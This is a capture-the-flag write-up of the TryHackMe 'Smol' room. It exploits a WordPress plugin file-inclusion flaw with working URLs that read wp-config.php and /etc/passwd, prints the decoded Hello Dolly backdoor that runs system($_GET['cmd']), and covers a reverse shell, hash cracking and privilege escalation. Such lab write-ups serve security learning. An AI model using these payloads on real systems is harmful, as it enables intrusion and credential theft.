---
date: 2025-01-27T11:31:43-06:00
# description: ""
image: "/images/THM-Smol/Smol.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "THM: Smol"
type: "post"
---

* Platform: TryHackMe
* Link: [Smol](https://tryhackme.com/r/room/smol)
* Level: Medium
* OS: Linux
---

[Read this write up in french](https://scorpiosec.com/fr/posts/thm-smol/)

Smol focuses on exploiting vulnerabilities in WordPress plugins. The challenge begins with enumerating a WordPress site using WPScan, where we discover a plugin vulnerable to Local File Inclusion (LFI). This allows us to extract credentials and log into the WordPress dashboard. Within the dashboard, a private note directs us to the source code of the Hello Dolly plugin, which contains a backdoor. Leveraging this backdoor, we gain an initial foothold. Through a series of privilege escalation techniques, we eventually gain access to a user with unrestricted sudo privileges, granting full root access to the system.

## Scanning 

```
nmap -sC -sV -Pn -oA nmap/Smol 10.10.230.246
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 20:59 CST
Nmap scan report for 10.10.230.246
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.63 seconds
```

With nmap we find two open ports:
* 22 running SSH 
* 80 running http with a redirection to `www.smol.thm`. We add it to our `/etc/hosts` file.

```
sudo echo "{TARGET_IP} www.smol.thm" | sudo tee -a /etc/hosts
```

## Enumeration

At `http://www.smol.thm/` we find a blog website.

![Smol blog website](/images/THM-Smol/smol_website.png)

With `Wappalyzer` we learn that the website uses WordPress.

![Smol Wappalyzer](/images/THM-Smol/WP_wappalyzer.png)

Using Gobuster for directory brute forcing we find a few directories.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://www.smol.thm
```

At `http://www.smol.thm/wp-includes/` we find the `/wp-includes/` directory containing WordPress core files.

> Note that direct browsing to the `wp-includes` directory should be **disabled**.

![wp-includes directory](/images/THM-Smol/wpincludes_smol.png)

At `http://www.smol.thm/wp-admin` we find a login page.

![wp-admin login](/images/THM-Smol/wpadmin_login.png)

Since we have a Wordpress website, we can use `WPScan` to enumerate users.

```
wpscan --url http://www.smol.thm/ --enumerate u
```

![wpscan users](/images/THM-Smol/wpscan_users.png)

We can also enumerate the plugins in use.

```
wpscan --url http://www.smol.thm/ --enumerate p
```

![wpscan plugins](/images/THM-Smol/wpscan_plugins.png)

WPScan finds two plugins in use:
* `twentytwentythree` which is outdated (version 1.2)
* `jsmol2wp` running with version 1.07 (up to date)

When we search an exploit for `jsmol2wp version 1.07` we find [CVE-2018-20463](https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654) with a PoC [here](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt). The vulnerability allows for arbitrary file read. Using the url below we find some credentials, `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

![credentials leaked](/images/THM-Smol/creds_leaked.png)


Using the same LFI vulnerability we also enumerate the users on the system.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../etc/passwd
```

We identify four users: `think`, `xavi`, `diego`, and `gege`.

![users on the system](/images/THM-Smol/system_users.png)

The credentials are valid on the WordPress login page giving us access to the Dashboard.

![WordPress dashboard](/images/THM-Smol/wp_dashboard.png)

In the `Pages` section we find a page (`Webmaster Tasks!!`) which was not displayed on the blog. We can also access it by going to `http://www.smol.thm/index.php/to-do/`.

![todo page](/images/THM-Smol/todo_page.png)

The first task mentions a plugin called `Hello Dolly`, telling us to check its source code. After some research we find that the plugin file (`hello.php`) is located in `wp-content/plugins`.

![hello dolly php file](/images/THM-Smol/hello_dolly.png)

## Initial Foothold

Once again leveraging our LFI vulnerability we can see the content of the file.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

![hello dolly code](/images/THM-Smol/hello_dolly_code.png)

We find an eval function and the base64 string decodes to: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. The function `hello_dolly()` seems to be a backdoor. The plugin is supposed to only show a line of the song [Hello Dolly](https://www.youtube.com/watch?v=l7N2wssse14&ab_channel=AustinCasey) on the Dashboard.

![hello dolly clyrics](/images/THM-Smol/hello_dolly_lyrics.png)

But now it also checks if the `cmd` parameter (`\143\155\x64` translates to `cmd`) exists in the query string of the HTTP request (`$_GET`). If it exists the `system` function executes the value of the `cmd` parameter as a system command on the server.

Example: `http://www.smol.thm/wp-admin/index.php?cmd=whoami` will execute the `whoami` command on the server.

![hello dolly command execution](/images/THM-Smol/command_execution.png)

We can use this to get a reverse shell.

> I used the reverse shell `nc mkfifo` from [revshells](https://www.revshells.com/) and URL encoded it.

```
http://www.smol.thm/wp-admin/index.php?cmd=REVSHELL
```

![revshell command](/images/THM-Smol/revshell_cmd.png)

On the listener we receive a connection.

![Foothold](/images/THM-Smol/foothold.png)

In `/opt` we find a file called `wp_backup.sql`.

![sql file](/images/THM-Smol/wpbackup.png)

### Shell as diego

With `cat wp_backup.sql | grep "wpuser"` we find the hashes of all the users. But we know that only four of them are actual users on the target system.

![Credentials in database](/images/THM-Smol/db_data.png)

```
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
```

These are WordPress hashes, we can use john to crack the hashes. We succeed in cracking the hash for `diego`.

```
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
```

![diego pwd](/images/THM-Smol/diego_pwd.png)

With the password we switch to `diego` and recover the user flag.

![user flag](/images/THM-Smol/user_flag.png)

Because `diego` is part of the `internal` group he can access the other users directory.

![internal group](/images/THM-Smol/internal_group.png)

In `/home/gege/` we find a file called `wordpress.old.zip` but we cannot interact with it with our current user.

![wordpress_old zip file](/images/THM-Smol/wordpress_old.png)

### Shell as think

We can see a `.ssh` file in the `think` user home directory.

![think user ssh directory](/images/THM-Smol/think_ssh.png)

![think ssh keys](/images/THM-Smol/think_ssh_keys.png)

We send the SSH key to our local kali machine and login as `think`.

![think ssh login](/images/THM-Smol/think_SSH_login.png)

### Shell as gege

We search for the files with SUID bit set.

```
find / -perm -4000 -type f 2>/dev/null
```

We discover the `/usr/bin/su` has the SUID bit set meaning we can execute the file with the with the permissions of the file's owner (root).

![SUID files](/images/THM-Smol/SUID_files.png)

We are able to switch to `gege` without being asked for a password form the user `think`, when using the command `su gege`.

![user gege](/images/THM-Smol/user_gege.png)

After checking the file `/etc/pam.d/su` (this file controls how `su` behaves) we see that there is a rule marking the authentication as sufficient if the current user is `think`.

![su file](/images/THM-Smol/su_file.png)

### Shell as xavi

We send `wordpress.old.zip` to our local kali. But it requires a password. We can use john to attempt to crack the zip password.

First we generate a suitable hash.

```
zip2john wordpress.old.zip > hash.txt
```

Then we crack it with john.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![archive password](/images/THM-Smol/archive_pwd.png)

With the password we unzip the archive.

Inside `wp-config.php` we find `xavi` password, with it we switch to that user.

![xavi password](/images/THM-Smol/xavi_pwd.png)

## Privilege Escalation

With `sudo -l`, we see that `xavi` has unrestricted sudo privileges allowing us to become root with `sudo su`.

![xavi to root](/images/THM-Smol/xavi2root.png)

### Unintended Method (I think)

From `think` user shell, we can use `/usr/bin/su root` to switch to the `root` user and the password is `root`.

> This also works from `www-data`, meaning we can get to the `root` user as soon as you get inside the system.

> EDIT: As of 01/28/2025, this method has been patched.

![root flag](/images/THM-Smol/root_flag.png)
